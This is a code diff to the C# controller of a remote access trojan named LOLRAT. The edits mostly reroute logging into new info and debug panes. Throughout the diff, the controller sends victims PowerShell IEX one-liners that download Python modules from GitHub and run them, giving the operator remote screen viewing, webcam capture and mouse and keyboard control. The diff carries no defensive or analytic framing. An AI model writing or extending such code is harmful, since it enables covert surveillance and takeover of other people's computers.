@@ -28,6 +28,7 @@ namespace LOLRAT_C2
         bool isMainC2 = true;
         int clientIDCounter = 1; // Counter for client identifiers
         string ActiveWindow;
+        bool isTyping = false;
 
         public Main()
         {
@@ -66,7 +67,7 @@ namespace LOLRAT_C2
                     Invoke(new Action(() =>
                     {
                         listBoxClients.Items.Add(clientEndPoint);
-                        txtOutput.AppendText("New client! IP: " + clientEndPoint + "\r\n");
+                        InfoOutput("New client! IP: " + clientEndPoint + "\r\n");
                     }));
 
                     // Extract IP and Port and add them to the DataGridView
@@ -157,11 +158,11 @@ namespace LOLRAT_C2
             // Check if SS is already running
             if (Application.OpenForms.OfType<SS>().Any())
             {
-                txtOutput.AppendText("SS is already running!\r\n");
+                InfoOutput("SS is already running!\r\n");
                 // Close the SS that is running
                 Application.OpenForms["SS"].Close();
                 // Send a command to client to stop SS
-                txtOutput.AppendText("Sending SS command to client...\r\n");
+                InfoOutput("Sending SS command to client...\r\n");
                 DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
                 string clientIP = selectedRow.Cells["IP"].Value.ToString();
                 int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
@@ -171,7 +172,8 @@ namespace LOLRAT_C2
                     // Create a command that kills all other python processes
                     byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/kill_ss.py\").Content'\"");
                     selectedClient.Stream.Write(data, 0, data.Length);
-                    txtOutput.AppendText("Sent command to client!\r\n");
+                    DebugOutput("Executed: " + "exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/kill_ss.py\").Content'\"");
+                    InfoOutput("Sent command to client!\r\n");
                 }
             }
             else
@@ -181,12 +183,12 @@ namespace LOLRAT_C2
                 string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");
 
                 // Start the SS form
-                txtOutput.AppendText("Starting image sharing form...\r\n");
+                InfoOutput("Starting image sharing form...\r\n");
                 SS ssForm = new SS(this);
                 ssForm.Show();
 
                 // Send the SS command to selected client
-                txtOutput.AppendText("Sending SS command to client...\r\n");
+                InfoOutput("Sending SS command to client...\r\n");
                 DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
                 string clientIP = selectedRow.Cells["IP"].Value.ToString();
                 int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
@@ -195,9 +197,10 @@ namespace LOLRAT_C2
                 {
                     byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ss.py\").Content " + IP + " " + PORT + "'\"");
                     selectedClient.Stream.Write(data, 0, data.Length);
-                    txtOutput.AppendText("Sent command to client!\r\n");
+                    DebugOutput("Executed: " + "exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ss.py\").Content " + IP + " " + PORT + "'\"");
+                    InfoOutput("Sent command to client!\r\n");
                 }
-                txtOutput.AppendText("Hopefully that worked...\r\n");
+                InfoOutput("Hopefully that worked...\r\n");
             }
         }
 
@@ -233,7 +236,7 @@ namespace LOLRAT_C2
                 {
                     byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlMouse.py\").Content {X} {Y} {Type}'\"");
                     selectedClient.Stream.Write(data, 0, data.Length);
-                    txtOutput.AppendText($"Sent {Type}-click to client at X: {X}, Y: {Y}!\r\n");
+                    DebugOutput($"Sent {Type}-click to client at X: {X}, Y: {Y}!\r\n");
                 }
                 else
                 {
@@ -248,41 +251,52 @@ namespace LOLRAT_C2
 
         public void ExecuteKeyboardClick(string Key, string ClientIPAddress)
         {
-            // Execute a mouse click on the current client
-            if (dgvClients.SelectedRows.Count > 0)
+            if (!isTyping)
             {
-                // Iterate through all rows in dgvClients and search for the client with the ClientIPAddress
-                foreach (DataGridViewRow row in dgvClients.Rows)
+                isTyping = true;
+                // Execute a mouse click on the current client
+                if (dgvClients.SelectedRows.Count > 0)
                 {
-                    if (row.Cells["IP"].Value.ToString() == ClientIPAddress)
+                    // Iterate through all rows in dgvClients and search for the client with the ClientIPAddress
+                    foreach (DataGridViewRow row in dgvClients.Rows)
                     {
-                        // Select the row with the client
-                        row.Selected = true;
-                        break;
+                        if (row.Cells["IP"].Value.ToString() == ClientIPAddress)
+                        {
+                            // Select the row with the client
+                            row.Selected = true;
+                            break;
+                        }
                     }
-                }
 
-                // Get the selected row details for later transmission
-                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
-                string clientIP = selectedRow.Cells["IP"].Value.ToString();
-                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
-                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
+                    // Get the selected row details for later transmission
+                    DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
+                    string clientIP = selectedRow.Cells["IP"].Value.ToString();
+                    int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
+                    ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
 
-                if (selectedClient != null)
-                {
-                    byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlKeyboard.py\").Content {Key}'\"");
-                    selectedClient.Stream.Write(data, 0, data.Length);
-                    txtOutput.AppendText($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlKeyboard.py\").Content {Key}'\"");
-                    txtOutput.AppendText($"Sent \"{Key}\" keystoke to client!\r\n");
+                    if (selectedClient != null)
+                    {
+                        byte[] data = Encoding.ASCII.GetBytes($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlKeyboard.py\").Content {Key}'\"");
+                        selectedClient.Stream.Write(data, 0, data.Length);
+                        DebugOutput($"exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ControlKeyboard.py\").Content {Key}'\"");
+                        InfoOutput($"Sent \"{Key}\" keystoke to client!\r\n");
+                    }
+                    else
+                    {
+                        MessageBox.Show("Selected client is null. Check FindClientByIPAndPort implementation.");
+                    }
                 }
                 else
                 {
-                    MessageBox.Show("Selected client is null. Check FindClientByIPAndPort implementation.");
+                    MessageBox.Show("No rows selected in the DataGridView.");
                 }
+                isTyping = false;
             }
             else
             {
-                MessageBox.Show("No rows selected in the DataGridView.");
+                // Try again in 500ms
+                Thread.Sleep(500);
+                ExecuteKeyboardClick(Key, ClientIPAddress);
             }
         }
 
@@ -298,12 +312,12 @@ namespace LOLRAT_C2
             string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");
 
             // Start the SS form
-            txtOutput.AppendText("Starting image sharing form...\r\n");
+            InfoOutput("Starting image sharing form...\r\n");
             SS ssForm = new SS(this);
             ssForm.Show();
 
             // Send the SS command to selected client
-            txtOutput.AppendText("Sending Webcam command to client...\r\n");
+            InfoOutput("Sending Webcam command to client...\r\n");
             DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
             string clientIP = selectedRow.Cells["IP"].Value.ToString();
             int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
@@ -312,9 +326,10 @@ namespace LOLRAT_C2
             {
                 byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/webcam.py\").Content " + IP + " " + PORT + "'\"");
                 selectedClient.Stream.Write(data, 0, data.Length);
-                txtOutput.AppendText("Sent command to client!\r\n");
+                DebugOutput("Executed: " + "exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/webcam.py\").Content " + IP + " " + PORT + "'\"");
+                InfoOutput("Sent command to client!\r\n");
             }
-            txtOutput.AppendText("Hopefully that worked...\r\n");
+            InfoOutput("Hopefully that worked...\r\n");
         }
 
         // ---------------------------------------------------------------------------
@@ -623,6 +638,7 @@ namespace LOLRAT_C2
             gbFC2.Visible = false;
             listBoxClients.Visible = false;
             txtOutput.Visible = false;
+            txtOutputDebug.Visible = false;
             txtCommand.Visible = false;
             btnSend.Visible = false;
             gbCommandSending.Visible = false;
@@ -637,7 +653,8 @@ namespace LOLRAT_C2
             gbFC2.Visible = false;
             listBoxClients.Visible = false;
             dgvClients.Visible = false;
-            txtOutput.Visible = true;
+            txtOutput.Visible = false;
+            txtOutputDebug.Visible = true;
             txtCommand.Visible = true;
             btnSend.Visible = true;
             gbCommandSending.Visible = true;
@@ -651,12 +668,29 @@ namespace LOLRAT_C2
             gbFC2.Visible = false;
             listBoxClients.Visible = false;
             dgvClients.Visible = false;
+            txtOutputDebug.Visible = false;
             txtOutput.Visible = true;
             txtCommand.Visible = true;
             btnSend.Visible = true;
             gbCommandSending.Visible = true;
             ActiveWindow = "Terminal";
             gbClientBox.Text = "Terminal";
+        }
+
+        // ---------------------------------------------------------------------------
+        //
+        //                             Info/Debug Output
+        //
+        // ---------------------------------------------------------------------------
+        public void DebugOutput(string Text)
+        {
+            txtOutputDebug.AppendText(Text + "\r\n");
+        }
+
+        public void InfoOutput(string Text)
+        {
+            txtOutput.AppendText(Text + "\r\n");
+            txtOutputDebug.AppendText(Text + "\r\n");
         }
 
 
